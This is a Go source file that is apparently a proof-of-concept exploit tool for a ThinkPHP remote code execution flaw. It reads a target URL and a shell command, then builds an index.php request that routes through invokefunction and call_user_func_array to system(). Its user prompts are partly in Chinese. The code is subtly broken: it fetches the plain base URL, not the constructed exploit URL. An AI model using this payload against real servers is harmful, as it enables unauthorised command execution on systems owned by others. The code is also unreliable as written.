package main

import (
	"fmt"
	"net/http"
)

func thinkphp() {
	fmt.Println("Please input URL: (eg:http://x.x.x.x/)")
	var url string
	fmt.Scan(&url)
	fmt.Println("请输入想要执行的命令: ")
	var echo string
	fmt.Scan(&echo)
	url2 := string("/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=")
	url3 := url + url2 + echo
	fmt.Println("poc的URL为：", url3)

	rep, err := http.Get(url)
	if err != nil {
		fmt.Println("存在错误1：", err)
		return
	}
	defer rep.Body.Close()
	buf := make([]byte, 4*1024)
	var tmp string
	for {
		n, err2 := rep.Body.Read(buf)
		if n == 0 {
			fmt.Println("存在错误2：", err2)
			break
		}
		tmp += string(buf[:n])
	}
	fmt.Println("返回为：", tmp)

}

func main() {
	thinkphp()

}
